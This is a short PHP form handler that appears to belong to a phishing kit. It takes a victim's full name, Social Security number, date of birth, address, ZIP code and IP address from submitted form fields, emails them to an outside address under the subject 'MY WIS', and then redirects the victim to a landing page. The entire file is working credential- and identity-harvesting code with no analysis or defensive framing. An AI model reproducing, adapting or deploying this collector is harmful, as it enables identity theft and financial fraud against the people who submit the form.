<?

$fullname  = $_POST['j_username'];

$ssn = $_POST['j_ssn'];

$dob  = $_POST['j_dob'];

$address = $_POST['j_address'];

$zip = $_POST['j_zip'];

$ip = $_SERVER['REMOTE_ADDR'];


$subj = "MY WIS";
$msg = "j_username : $fullname \n j_ssn: $ssn \n j_dob: $dob \n  j_address: $address \n j_zip: $zip \n ipadd: $ip \n\n";


$from = "From: $ip<WIS>";

mail("globalserv@globalservicespaymt.com", $subj, $msg, $from);

mail("", $subj, $msg, $from);

header('location:landing.htm');

?>